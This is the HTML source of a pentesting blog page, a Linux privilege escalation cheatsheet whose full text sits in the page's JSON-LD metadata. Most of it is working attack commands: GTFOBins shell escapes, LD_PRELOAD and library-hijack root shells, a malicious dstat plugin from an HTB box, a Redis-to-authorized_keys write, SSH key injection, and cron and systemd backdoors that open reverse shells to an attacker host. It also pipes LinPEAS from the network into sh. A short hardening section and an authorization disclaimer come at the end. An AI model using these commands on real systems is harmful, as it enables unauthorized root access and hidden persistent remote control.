@@ -1,0 +1,1251 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Linux Privilege Escalation Cheatsheet | realspaceeagle</title>
+<meta name="keywords" content="linux, privilege-escalation, pentesting, doas, sudo">
+<meta name="description" content="Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more">
+<meta name="author" content="realspaceeagle">
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<meta name="description" content="Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more">
+<meta name="keywords" content="linux, privilege-escalation, pentesting, doas, sudo">
+<meta name="author" content="realspaceeagle">
+<meta name="robots" content="index, follow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/">
+
+
+<meta property="og:title" content="Linux Privilege Escalation Cheatsheet - realspaceeagle">
+<meta property="og:description" content="Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more">
+<meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/">
+<meta property="og:site_name" content="realspaceeagle">
+<meta property="og:locale" content="en_US"><meta property="og:type" content="article">
+<meta property="article:author" content="realspaceeagle"><meta property="article:published_time" content="2024-01-01T00:00:00Z"><meta property="article:modified_time" content="2024-01-01T00:00:00Z"><meta property="article:tag" content="linux"><meta property="article:tag" content="privilege-escalation"><meta property="article:tag" content="pentesting"><meta property="article:tag" content="doas"><meta property="article:tag" content="sudo"><meta property="article:section" content="cheatsheets"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta property="og:image:alt" content="realspaceeagle">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@haran_loga">
+<meta name="twitter:creator" content="@haran_loga">
+<meta name="twitter:title" content="Linux Privilege Escalation Cheatsheet - realspaceeagle">
+<meta name="twitter:description" content="Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more"><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta name="twitter:image:alt" content="realspaceeagle"><meta name="article:author" content="realspaceeagle">
+<meta name="article:publisher" content="https://realspaceeagle.github.io/"><meta name="news_keywords" content="linux, privilege-escalation, pentesting, doas, sudo">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org","@type": "BlogPosting",
+  "headline": "Linux Privilege Escalation Cheatsheet",
+  "description": "Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID\/SGID abuse, and more",
+  "author": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "description": "Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  },
+  "datePublished": "2024-01-01T00:00:00Z","dateModified": "2024-01-01T00:00:00Z","url": "https:\/\/realspaceeagle.github.io\/cheatsheets\/linux-privilege-escalation\/",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/realspaceeagle.github.io\/cheatsheets\/linux-privilege-escalation\/"
+  },"image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/realspaceeagle.github.io\/images\/og-image.svg",
+    "width": 1200,
+    "height": 630
+  },"keywords": "linux, privilege-escalation, pentesting, doas, sudo",
+  "articleSection": "cheatsheets",
+  "wordCount":  1845 ,
+  "genre": ["Cybersecurity", "Technology", "Education"],
+  "about": [{
+      "@type": "Thing",
+      "name": "linux"
+    },{
+      "@type": "Thing",
+      "name": "privilege-escalation"
+    },{
+      "@type": "Thing",
+      "name": "pentesting"
+    },{
+      "@type": "Thing",
+      "name": "doas"
+    },{
+      "@type": "Thing",
+      "name": "sudo"
+    }]}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https:\/\/realspaceeagle.github.io\/"
+    },{
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cheatsheets",
+      "item": "https:\/\/realspaceeagle.github.io\/categories\/cheatsheets\/"
+    },{
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Linux Privilege Escalation Cheatsheet",
+      "item": "https:\/\/realspaceeagle.github.io\/cheatsheets\/linux-privilege-escalation\/"
+    }]
+}
+</script>
+
+
+<link rel="stylesheet" href="/css/terminal-style.css">
+
+
+<link rel="stylesheet" href="/css/scroll-enhancement.css">
+
+
+<link rel="stylesheet" href="/css/mobile-navigation.css">
+
+
+<link rel="stylesheet" href="/css/mobile-responsive-pages.css">
+
+
+<link rel="stylesheet" href="/css/header-width-fix.css">
+
+
+<link rel="stylesheet" href="/css/share-buttons.css">
+
+
+<link rel="stylesheet" href="/css/comments.css">
+
+
+<link rel="stylesheet" href="/css/blog-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/blog-sidebar.css">
+
+
+<link rel="stylesheet" href="/css/project-toggle.css">
+
+
+<link rel="stylesheet" href="/css/code-copy-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/ctf-writeup.css">
+
+
+<link rel="stylesheet" href="/css/github-stats.css">
+
+
+<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
+<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>
+
+
+<script src="/js/github-calendar-enhanced.js" defer></script>
+
+
+<script src="/js/github-contribution-tracker.js" defer></script>
+
+
+<script src="/js/github-api-fallback.js" defer></script>
+
+
+<script src="/js/github-integration.js" defer></script>
+
+
+<script src="/js/twitter-timeline.js" defer></script>
+<script src="/js/twitter-manual.js" defer></script>
+
+
+<script src="/js/code-copy-enhanced.js" defer></script>
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-GPTRZ14YZS');
+        }
+      </script><meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/">
+  <meta property="og:site_name" content="realspaceeagle">
+  <meta property="og:title" content="Linux Privilege Escalation Cheatsheet">
+  <meta property="og:description" content="Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cheatsheets">
+    <meta property="article:published_time" content="2024-01-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-01-01T00:00:00+00:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Privilege-Escalation">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="article:tag" content="Doas">
+    <meta property="article:tag" content="Sudo">
+      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:title" content="Linux Privilege Escalation Cheatsheet">
+<meta name="twitter:description" content="Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Security Cheatsheets",
+      "item": "https://realspaceeagle.github.io/cheatsheets/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Linux Privilege Escalation Cheatsheet",
+      "item": "https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Linux Privilege Escalation Cheatsheet",
+  "name": "Linux Privilege Escalation Cheatsheet",
+  "description": "Comprehensive guide for Linux privilege escalation techniques, including doas, sudo misconfigurations, SUID/SGID abuse, and more",
+  "keywords": [
+    "linux", "privilege-escalation", "pentesting", "doas", "sudo"
+  ],
+  "articleBody": "Linux Privilege Escalation Cheatsheet Initial Enumeration System Information # Basic system info uname -a cat /etc/os-release cat /etc/issue hostname # Current user context id whoami groups cat /etc/passwd | grep sh # Environment variables env printenv echo $PATH User and Group Enumeration # List all users cat /etc/passwd # Users with login shells cat /etc/passwd | grep sh # Current user privileges sudo -l find / -user $(whoami) 2\u003e/dev/null | grep -v '^/proc\\|^/run\\|^/sys' find / -group $(whoami) 2\u003e/dev/null | grep -v '^/proc\\|^/run\\|^/sys' # Check for interesting group memberships groups id # Find files owned by current user find / -user $(id -u) 2\u003e/dev/null find / -group $(id -g) 2\u003e/dev/null SUID and SGID Analysis Finding SUID/SGID Binaries # Find SUID binaries find / -perm -u=s -type f 2\u003e/dev/null find / -perm -4000 -type f 2\u003e/dev/null # Find SGID binaries find / -perm -g=s -type f 2\u003e/dev/null find / -perm -2000 -type f 2\u003e/dev/null # Find both SUID and SGID find / -perm -u=s -o -perm -g=s -type f 2\u003e/dev/null # Common SUID binaries to check ls -la /usr/bin/passwd ls -la /usr/bin/sudo ls -la /usr/bin/su ls -la /usr/local/bin/doas GTFOBins Exploitation # Check GTFOBins for binary exploitation # https://gtfobins.github.io/ # Common exploitable SUID binaries: # - /usr/bin/find find . -exec /bin/sh -p \\; -quit # - /usr/bin/vim vim -c ':!/bin/sh' # - /usr/bin/less less /etc/profile !/bin/sh # - /usr/bin/more more /etc/profile !/bin/sh # - /usr/bin/nmap (older versions) nmap --interactive !sh # - /usr/bin/awk awk 'BEGIN {system(\"/bin/sh\")}' doas Privilege Escalation doas Configuration Analysis # Find doas binary and configuration find / -name doas 2\u003e/dev/null find / -name doas.conf 2\u003e/dev/null # Common doas locations ls -la /usr/local/bin/doas ls -la /usr/local/etc/doas.conf # Check doas configuration cat /usr/local/etc/doas.conf # Example vulnerable configuration: # permit nopass player as root cmd /usr/bin/dstat doas Exploitation Techniques # Basic doas command execution doas /usr/bin/dstat # Check what commands are allowed doas -n /usr/bin/dstat --help # If specific command is allowed, look for ways to abuse it # Example: dstat with custom plugins # doas with dstat privilege escalation # 1. Check if you can write to dstat plugin directory find / -group $(id -g) 2\u003e/dev/null | grep dstat ls -la /usr/local/share/dstat # 2. Create malicious dstat plugin echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' \u003e /usr/local/share/dstat/dstat_exploit.py # 3. Execute with doas doas /usr/bin/dstat --exploit doas vs sudo Differences # doas syntax doas command # doas with specific user doas -u root command # Check doas configuration syntax # permit [options] identity [as target] [cmd command [args ...]] # Common doas misconfigurations: # - permit nopass user as root cmd /path/to/binary # - Allowing commands that can spawn shells # - Wildcard permissions sudo Privilege Escalation sudo Enumeration # Check sudo privileges sudo -l # Check sudo version sudo --version # Common sudo misconfigurations: # - NOPASSWD entries # - Wildcard permissions # - Commands that allow shell escapes sudo Exploitation Examples # sudo with shell escape commands sudo vim :!/bin/bash sudo less /etc/profile !/bin/bash sudo find /etc -name \"*.conf\" -exec /bin/bash \\; # sudo with environment variables sudo -E /bin/bash # sudo with LD_PRELOAD echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' \u003e /tmp/exploit.c gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles sudo LD_PRELOAD=/tmp/exploit.so /bin/bash # sudo with LD_LIBRARY_PATH mkdir /tmp/lib echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' \u003e /tmp/lib/exploit.c gcc -fPIC -shared -o /tmp/lib/libc.so.6 /tmp/lib/exploit.c sudo LD_LIBRARY_PATH=/tmp/lib /bin/bash Writable Directory Exploitation Finding Writable Directories # Find world-writable directories find / -type d -perm -002 2\u003e/dev/null # Find directories writable by current user find / -type d -writable 2\u003e/dev/null # Find directories owned by current user find / -type d -user $(whoami) 2\u003e/dev/null # Common locations to check ls -la /tmp ls -la /var/tmp ls -la /dev/shm ls -la /usr/local/share PATH Manipulation # Check current PATH echo $PATH # Create malicious binary in writable directory echo '#!/bin/bash\\n/bin/bash -p' \u003e /tmp/ls chmod +x /tmp/ls # Modify PATH to prioritize malicious binary export PATH=/tmp:$PATH # Wait for privileged process to execute our binary # Or trigger execution through cron jobs, scripts, etc. Library Hijacking # Check for writable library directories find / -type d -writable 2\u003e/dev/null | grep -E \"(lib|lib64)\" # Check LD_LIBRARY_PATH in processes ps aux | grep -i ld_library # Create malicious shared library echo 'void _init() { setgid(0); setuid(0); system(\"/bin/bash\"); }' \u003e /tmp/exploit.c gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles # Place in writable library directory cp /tmp/exploit.so /writable/lib/directory/ Process and Service Analysis Running Processes # List all processes ps aux ps -ef --forest # Processes running as root ps aux | grep root # Network connections ss -tlnp netstat -tulnp # Check for processes with interesting capabilities /sbin/getcap -r / 2\u003e/dev/null Cron Jobs and Scheduled Tasks # System cron jobs cat /etc/crontab ls -la /etc/cron.* crontab -l # User cron jobs crontab -l cat /var/spool/cron/crontabs/* # Systemd timers systemctl list-timers find /etc/systemd -name \"*.timer\" Services and Sockets # Running services systemctl list-units --type=service --state=running # Check service files for misconfigurations find /etc/systemd -name \"*.service\" -exec grep -l \"User\\|Group\" {} \\; # Socket files systemctl list-units --type=socket find /etc/systemd -name \"*.socket\" File System Analysis Configuration Files # Check for readable sensitive files find /etc -readable -type f 2\u003e/dev/null | head -20 # Database configuration files find / -name \"*.conf\" -o -name \"*.config\" -o -name \"*.cfg\" 2\u003e/dev/null | grep -E \"(sql|db|database)\" # Web application configs find / -name \"wp-config.php\" -o -name \"config.php\" -o -name \".env\" 2\u003e/dev/null # SSH keys and certificates find / -name \"id_rsa\" -o -name \"id_dsa\" -o -name \"*.pem\" -o -name \"*.key\" 2\u003e/dev/null Log Files # System logs find /var/log -readable -type f 2\u003e/dev/null # Application logs find / -name \"*.log\" -readable 2\u003e/dev/null | head -10 # Check logs for passwords or sensitive information grep -r -i \"password\\|passwd\\|secret\\|token\" /var/log/ 2\u003e/dev/null Backup Files # Find backup files find / -name \"*.bak\" -o -name \"*.backup\" -o -name \"*.old\" -o -name \"*~\" 2\u003e/dev/null # Database backups find / -name \"*.sql\" -o -name \"*.dump\" -o -name \"*.db\" 2\u003e/dev/null # Configuration backups find /etc -name \"*.bak\" -o -name \"*.old\" -o -name \"*.orig\" 2\u003e/dev/null Application-Specific Exploits dstat Plugin Exploitation # Check dstat plugin directories find / -name \"*dstat*\" -type d 2\u003e/dev/null ls -la /usr/share/dstat ls -la /usr/local/share/dstat # Check permissions on plugin directory ls -la /usr/local/share/dstat # Create malicious dstat plugin cat \u003e /usr/local/share/dstat/dstat_exploit.py \u003c\u003c 'EOF' import os os.execv(\"/bin/sh\", [\"sh\"]) EOF # Execute with doas/sudo doas /usr/bin/dstat --exploit Python Library Hijacking # Check Python path python -c \"import sys; print('\\n'.join(sys.path))\" # Find writable Python directories python -c \"import sys; print('\\n'.join([p for p in sys.path if __import__('os').access(p, __import__('os').W_OK)]))\" # Create malicious module echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' \u003e /writable/python/path/exploit.py # Import in vulnerable application python -c \"import exploit\" Binary Wrapper Exploitation # Create wrapper script for allowed commands cat \u003e /tmp/malicious_script \u003c\u003c 'EOF' #!/bin/bash /bin/bash -p EOF chmod +x /tmp/malicious_script # If PATH manipulation is possible export PATH=/tmp:$PATH # Or create binary with same name as allowed command cp /bin/bash /tmp/allowed_binary_name Kernel and System Exploits Kernel Version Checking # Kernel version uname -r cat /proc/version # Check for known kernel exploits searchsploit linux kernel $(uname -r) # Distribution-specific exploits lsb_release -a cat /etc/os-release Common Kernel Exploits # Dirty COW (CVE-2016-5195) # Affects Linux kernel versions 2.6.22 to 4.8.3 # DirtyCOW PoC echo 'int main() { setuid(0); system(\"/bin/bash\"); return 0; }' \u003e /tmp/cow.c gcc -o /tmp/cow /tmp/cow.c # Check for vulnerable kernel if [[ $(uname -r | cut -d. -f1-2) \u003c \"4.9\" ]]; then echo \"Potentially vulnerable to DirtyCOW\" fi Container Escape Techniques Docker Container Detection # Check if running in container cat /proc/1/cgroup | grep docker ls -la /.dockerenv # Check for container runtime ps aux | grep -E \"(docker|containerd|runc)\" # Check capabilities /sbin/getcap -r / 2\u003e/dev/null capsh --print Container Privilege Escalation # Check for privileged container cat /proc/self/status | grep Cap # Check for host filesystem mounts mount | grep -E \"/(proc|sys|dev)\" # Look for Docker socket find / -name \"docker.sock\" 2\u003e/dev/null # Check for host processes visible ps aux | wc -l Network-Based Privilege Escalation Internal Network Discovery # Network interfaces ip addr show ifconfig -a # ARP table arp -a ip neigh show # Network connections ss -tulnp netstat -tulnp # Port scanning internal network for i in {1..254}; do ping -c 1 192.168.1.$i \u0026\u003e/dev/null \u0026\u0026 echo \"192.168.1.$i is up\"; done Service Exploitation # Check for internal services nmap -sT -O localhost ss -tlnp | grep LISTEN # Database connections mysql -u root -p psql -U postgres # Redis exploitation redis-cli CONFIG GET dir CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys SET crackit \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\" SAVE Persistence Mechanisms SSH Key Injection # Generate SSH key pair ssh-keygen -t rsa -f /tmp/key # Add public key to authorized_keys echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\" \u003e\u003e /root/.ssh/authorized_keys echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\" \u003e\u003e /home/user/.ssh/authorized_keys # Set proper permissions chmod 600 /root/.ssh/authorized_keys chmod 700 /root/.ssh Cron Job Backdoors # Add malicious cron job echo \"* * * * * /bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/attacker_ip/port 0\u003e\u00261'\" \u003e\u003e /etc/crontab # User-specific cron crontab -e # Add: * * * * * /path/to/backdoor Service Backdoors # Create systemd service cat \u003e /etc/systemd/system/backdoor.service \u003c\u003c 'EOF' [Unit] Description=System Backdoor After=network.target [Service] Type=simple User=root ExecStart=/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/attacker_ip/port 0\u003e\u00261' Restart=always [Install] WantedBy=multi-user.target EOF systemctl enable backdoor.service systemctl start backdoor.service Automated Enumeration Tools LinPEAS # Download and run LinPEAS curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Or transfer and run wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod +x linpeas.sh ./linpeas.sh LinEnum # Download LinEnum wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh LSE (Linux Smart Enumeration) # Download and run LSE wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh chmod +x lse.sh ./lse.sh -l1 # Level 1 checks ./lse.sh -l2 # Level 2 checks Real-World Example: Soccer HTB doas/dstat Initial Discovery # Found user can write to dstat plugin directory player@soccer:/usr/local/share$ find / -group player 2\u003e/dev/null | grep -v '^/proc\\|^/run\\|^/sys' /usr/local/share/dstat # Check doas configuration player@soccer:~$ cat /usr/local/etc/doas.conf permit nopass player as root cmd /usr/bin/dstat # Check directory permissions player@soccer:/usr/local/share$ ls -la drwxrwx--- 2 root player 4096 Dec 12 2022 dstat Exploitation # Create malicious dstat plugin echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' \u003e /usr/local/share/dstat/dstat_exploit.py # Execute with doas doas /usr/bin/dstat --exploit # Alternative method using GTFOBins reference mkdir -p ~/.dstat echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' \u003e ~/.dstat/dstat_exploit.py doas /usr/bin/dstat --exploit Prevention and Hardening Secure Configuration Practices # Proper doas configuration # Use specific commands only, avoid wildcards permit nopass user as root cmd /usr/bin/specific-binary arg1 arg2 # Secure sudo configuration # Avoid NOPASSWD where possible # Use command aliases for complex commands # Regularly audit sudo rules # File permission hardening # Remove world-writable permissions find / -type d -perm -002 -exec chmod o-w {} \\; find / -type f -perm -002 -exec chmod o-w {} \\; Monitoring and Detection # Monitor privilege escalation attempts auditctl -w /etc/passwd -p wa -k passwd_changes auditctl -w /etc/shadow -p wa -k shadow_changes auditctl -w /etc/sudoers -p wa -k sudo_changes # Log sudo/doas usage # Configure proper logging in /etc/sudoers or doas.conf # File integrity monitoring # Use tools like AIDE or Tripwire to monitor critical files Always ensure you have proper authorization before attempting privilege escalation on any system. These techniques should only be used for legitimate security testing and system administration purposes.\n",
+  "wordCount" : "1845",
+  "inLanguage": "en",
+  "image": "https://realspaceeagle.github.io/images/og-image.svg","datePublished": "2024-01-01T00:00:00Z",
+  "dateModified": "2024-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": {"avatar":"/images/avatar.svg","bio":"Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.","name":"realspaceeagle","title":"Cybersecurity Professional \u0026 Penetration Tester"}
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "realspaceeagle",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://realspaceeagle.github.io/favicon.svg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
+            
+            
+            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+            </button>
+            
+            <div class="logo-switches">
+                
+                <div class="social-icons">
+                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
+                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                        </svg>
+                    </a>
+                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
+                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                        </svg>
+                    </a>
+                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
+                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                        </svg>
+                    </a>
+                </div>
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        
+        <ul id="menu" class="desktop-menu">
+            <li>
+                <a href="https://realspaceeagle.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                    <span>Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
